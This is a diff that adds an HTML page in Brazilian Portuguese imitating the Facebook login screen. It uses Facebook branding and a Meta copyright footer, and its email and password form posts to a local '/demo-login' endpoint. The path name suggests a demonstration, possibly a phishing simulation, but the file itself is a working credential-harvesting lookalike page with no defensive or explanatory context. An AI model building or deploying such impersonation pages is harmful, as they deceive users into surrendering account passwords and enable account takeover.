@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Entrar no Facebook</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="brand-facebook">
+  <main class="auth-page">
+    <section class="auth-card">
+      <h1 class="fb-wordmark">facebook</h1>
+      <p class="auth-sub">Entrar no Facebook</p>
+
+      <form method="POST" action="/demo-login">
+        <input type="hidden" name="provider" value="Facebook">
+        <input id="email" name="email" type="text" autocomplete="off" placeholder="E-mail ou telefone" required autofocus>
+        <input id="password" name="password" type="password" autocomplete="off" placeholder="Senha" required>
+
+        <button class="btn btn-fb" type="submit">Entrar</button>
+      </form>
+
+      <div class="auth-form-foot">
+        <a class="link" href="#">Esqueceu a conta?</a>
+        <a class="link" href="#">Esqueceu a senha?</a>
+      </div>
+
+      <div class="divider">ou</div>
+
+      <button class="btn btn-create" type="button">Criar nova conta</button>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <small>Meta &copy; 2026</small>
+  </footer>
+</body>
+</html>
